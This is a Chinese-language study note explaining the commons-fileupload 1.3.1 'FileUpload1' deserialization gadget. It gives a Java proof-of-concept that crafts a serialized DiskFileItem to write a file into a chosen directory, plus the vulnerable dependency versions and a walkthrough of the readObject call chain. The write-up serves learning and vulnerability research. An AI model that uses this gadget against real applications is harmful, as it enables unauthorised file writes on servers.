#  FileUpload1反序列化漏洞(学习笔记)   
 白帽子   2023-12-20 00:00  
  
##### commons-fileupload的简介  
  
FileUpload包可以很容易地添加强大的，高性能，文件上传到你的  
Servlet  
的Web应用程序的能力。  
  
FileUpload解析HTTP请求符合RFC 1867年，“在HTML的文件上传。就是说，如果一个HTTP请求是使用POST方法提交，并与一个内容类型“multipart/norm-data”，然后FileUpload可以解析这个请求，并把结果提供一个容易使用的调用方式。  
##### 最终payload  
```
        byte[] bytes = "relay学安全".getBytes("UTF-8");
        File repository = new File("/Users/relay/Downloads/aaa");

        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);

        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);
        serialize(diskFileItem);
        unserialize("ser.bin");

        public static void serialize(Object obj) throws Exception {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
          oos.writeObject(obj);
      }

      public static Object unserialize(String Filename) throws Exception {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object obj = ois.readObject();
          return obj;
      }
```  
##### 漏洞环境  
###### maven依赖  
```
<dependency>
    <groupId>commons-fileupload</groupId>
    <artifactId>commons-fileupload</artifactId>
    <version>1.3.1</version>
</dependency>
<!-- https://mvnrepository.com/artifact/commons-io/commons-io -->
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.4</version>
</dependency>
```  
######   
  
Jdk版本是1.8，所以我们只能往指定的目录去写入临时文件。  
##### 漏洞流程  
  
首先我们简单来看一下这个payload,可以看他他反序列化的是diskFileItem，diskFileItem是DiskFileItem类，那也就是说他会调用DiskFileItem类的readObject方法，我们跟进去看看。首先我们看到他的构造函数中对这一大堆值进行了赋值。  
  
简单来说下主要的几个值都代表什么。  
  
fileName: 原始的文件名  
  
sizeThreshold:文件大小阈值，如果超过这个值，上传文件将会被储存在硬盘上  
  
repository:File 类型的成员变量，如果文件保存到硬盘上的话，保存的位置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvctuvxUkMkT7sAsudWiaQO66tKxkoFxfqsuxPoXfpxdI13p2Fuic5X1kQ/640?wx_fmt=png "")  
  
还有几个值并没有在构造函数中进行赋值，那么我们就需要通过反射进行给他赋值了。  
```
private byte[] cachedContent; //这个值后面不能让他为空，不然写入不了文件。
private File dfosFile; //一个 File 对象，允许对其序列化的操作
private transient DeferredFileOutputStream dfos; //一个 DeferredFileOutputStream 对象，用于 OutputStream 的写出
```  
  
我们跟进readObject方法。首先进行了几个判断，判断我们的repository不为空的话，接着判断repository如果是目录的话，紧接着判断我们的path路径中是否有 \0 如果有的话直接抛出异常，我们的repository是通过DiskFileItem的构造函数赋值过得。他的值是我们的目录。/Users/relay/Downloads/aaa  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvH1aHecVD3WfHV2icjwfBRsDa6AKzD0MEnRiaiaUbAHqo80f6cyWicAQHYA/640?wx_fmt=png "")  
  
接下往下走来到下半段，首先调用getOutputStream方法，返回的是一个OutputStream对象，我们跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvuPktqWMJN0DgPLfzjV4TVOThSUTjVib2Hr6FcxaSVjENoj5yibPzKXZQ/640?wx_fmt=png "")  
  
来到getOutputStream方法，首先判断dfos(就是我们的DeferredFileOutputStream对象)是否为null，这个值我们是通过反射进行赋值过得，所以接下来调用getTempFile方法。跟进去。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvJ1qNl3mbFYmibzXdFTAa7jPNsboMKp45cH2J8msyuUXbAvlWwFWfx4A/640?wx_fmt=png "")  
  
来到getTempFile方法，将我们的目录复制给了tempDir变量，然后通过调用format方法进行格式化，然后赋值给tempFileName，最后封装成File类，然后返回。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsv3DrBzYMZY57mhyBcOFnexR5yCF6ibmMJ91BNU7fEH6Js49SxJhKjycw/640?wx_fmt=png "")  
  
回到readObject方法，判断cachedContent如果不等于null的话，直接就将cachedContent写入，cachedContent通过反射已经给他赋值过了他的值是relay学安全。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvtzzUesyWll9yKpCwbNaSricBB4wEoXE1twB21JXJRaNuQ99wT9DrLVA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2morfo2v8dHMAYoHtTjAiaDsvEZWhMVbC56zNyWuvYicNGCibz2yfJQrQd3IxYTwAFkBn8vnHF2Z34XoA/640?wx_fmt=png "")  
  
到这里就基本结束了，我们可能在想这个漏洞写进去临时文件也没什么用处啊。  
  
这个漏洞他是跟jdk版本相关的，但是基本上不会使用jdk1.7 或者 1.6了。所以jdk1.8 + commons-fileupload 1.3.1只能做到指定目录写文件，并且只是临时文件。  
  
参考:  
  
https://paper.seebug.org/731/#payload_1  
  
  
